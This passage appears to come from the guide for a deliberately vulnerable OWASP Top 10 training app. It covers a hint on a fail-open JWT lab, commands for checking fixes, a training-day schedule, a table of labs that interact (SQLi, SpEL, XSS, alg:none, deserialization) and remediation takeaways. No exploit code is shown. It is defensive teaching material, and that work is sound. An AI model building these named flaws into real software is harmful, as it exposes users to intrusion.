  `Authorization` header never enters the `try` block at all, so it is
  anonymous by default and unaffected by this bug. The bug needs a
  *token* that names nobody.
- And note the exception taxonomy. The project has a
  `LabMalformedTokenException` that is distinct from jjwt's
  `JwtException`. Why does that distinction matter?
  - A **structurally broken** token (garbage, not parseable) must be a
    `401`.
  - A token with a **bad signature** must also be a `401`.
  - But you must not accidentally make a *fix for Lab 25* also change
    Lab 21's verdict, or the other way round. Check both after you fix.

The general lesson, worth writing down: **never let an exception path
invent an identity.** An anonymous request is anonymous; it does not
default to the first user in the database.

---

## Part 4 — Check your work

### One lab at a time

```bash
python3 verify/run.py --lab 7
```

The verdict tells you exactly where you are:

- `FIXED` — the exploit no longer works. Move on.
- `VULNERABLE` — the exploit still works. Read the detail line, look at the
  code again.
- `INCONCLUSIVE` — the check could not be made. Read the detail line. It
  usually means the app is not running, or the response shape changed
  (which usually means you broke something else on the way).

### Everything at once

```bash
make verify-fixed
```

All 25 must report `FIXED`.

### Prove your fixes are independent

```bash
make matrix
```

This applies each lab's fix **one at a time**, rebuilds, and asserts that
**exactly one** verdict flips. If fixing Lab 7 also un-fixes Lab 10, that
is a bug in the lab design — and the matrix will point it out before you
waste an afternoon on it.

> This takes a while: it rebuilds and restarts the app once per lab.

### Did you break the app?

```bash
make test
```

The JUnit suite covers the seed integrity and the JWT lab tests.

---

## Part 5 — Training session guide

### Suggested timing (full day)

| Time | Content |
|------|---------|
| 09:00 | Setup: `make up`, `make run`, `make ui-install`, `make ui`, `make verify` |
| 09:20 | Intro: OWASP Top 10, the "a lab is fixed by changing code" rule |
| 09:40 | **A01** — Access Control (Labs 1–3) |
| 10:40 | **A02** — Misconfiguration (Labs 4–6) |
| 11:10 | **A04** — Cryptographic Failures (Labs 7–9) |
| 11:40 | Break |
| 11:55 | **A05** — Injection (Labs 10–13): SQLi, SpEL, command injection, XSS |
| 13:10 | Lunch |
| 14:10 | **A06** — Insecure Design (Labs 14–16) |
| 14:40 | **A07** — Auth Failures (Labs 17–19) |
| 15:25 | **A08** — Integrity Failures (Labs 20–22) |
| 16:10 | **A10** — Exception Handling (Labs 23–25) |
| 16:50 | Q&A, recap, remediation principles |
| 17:20 | End |

### Half-day option (priority labs)

A01-Lab1 (IDOR) → A05-Lab10 (SQLi) → A05-Lab11 (SpEL) → A05-Lab13 (XSS) →
A07-Lab19 (reset token) → A08-Lab20 (deserialization) → A10-Lab25 (fail-open)

Those seven cover the biggest ideas: authorisation, injection, stored XSS,
insecure recovery, unsafe deserialisation, and the fail-open default.

### The labs that are designed to interact

Some labs deliberately share machinery. Fixing one must not un-fix
another — the matrix proves it, but it is worth knowing where to look:

| Pair | Why they interact |
|---|---|
| 5 (default creds) ↔ 7 (hashing) | Both touch the admin's stored hash. Fix the *comparison* in one and the *algorithm* in the other; the seed row in `data.sql` is shared. |
| 7 (hashing) ↔ 10 (SQLi) | Lab 10's fix moves the password check from SQL into Java. Lab 7's fix changes the algorithm that check uses. Independent — if you keep the check in Java, both stay fixed. |
| 11 (SpEL) ↔ 12 (SSTI) | Both are template injection, but their *code* is in different classes and their fixes are independent. Fixing one does not fix the other. |
| 8 (hardcoded secret) ↔ 21 (`alg:none`) ↔ 25 (fail-open) | One `LabJwtService` and one `LabAuthFilter`. The secret matters for 8; `alg:none` does not need the secret; fail-open does not need a valid token at all. Three separate bugs, three separate fixes. |
| 4 (debug trace) ↔ 23 (verbose error) ↔ 24 (type coercion) | Lab 23 is about the global `server.error.include-*` settings. Lab 24 has its **own** handler precisely so it does not ride on Lab 23's fix. |
| 13 (stored XSS) ↔ 18 (session fixation) | Session fixation is usually delivered *through* a stored XSS. Fix Lab 13 and you lose the delivery mechanism for Lab 18 — but the fix for Lab 18 is still the fix for Lab 18. |

### Key takeaways per category

| Category | Core message |
|----------|-------------|
| A01 | Authorisation must be enforced server-side, on every request, against the object being touched — not just "is this person logged in". |
| A02 | Defaults are insecure. Every file, every setting, every shipped credential is a decision you have to make deliberately. |
| A04 | Cryptography is not optional, and the algorithm choice matters as much as using it. Fast hashes are for checksums, not passwords. |
| A05 | Never let user input become code. Know where your strings end up — a query, an expression, a command line, an HTML page. |
| A06 | Security requirements have to be designed in. A perfectly implemented missing rule is still a missing rule. |
| A07 | Authentication is more than checking a password. It is rate limiting, session lifecycle, and unforgeable recovery tokens. |
| A08 | Only run code that you wrote and control. Data formats must not be able to name classes, and tokens must be verified the way you configured them. |
| A10 | Exceptions must fail **closed**. Never let an error path invent an identity, and never show the internals to the client. |

---

## Where to go next

- `solutions/SOLUTIONS.md` — the full fix reference for all 25 labs, with
  the vulnerable code and the fixed code side by side. Compare *after* you
  have tried, not before.
- `python3 verify/run.py --show <id>` — one lab's metadata: its title, OWASP
  category, severity, endpoints, and the file and
  method to fix.
- The **Labs panel** in the running app (top right of the navbar) — the same
  information, in the browser. Its metadata comes from
  `frontend/src/labs.json`, which is generated from `verify/manifest.json`
  by `scripts/gen_labs_json.py` — the same source `--show` reads, so the
  panel cannot drift from the guide.
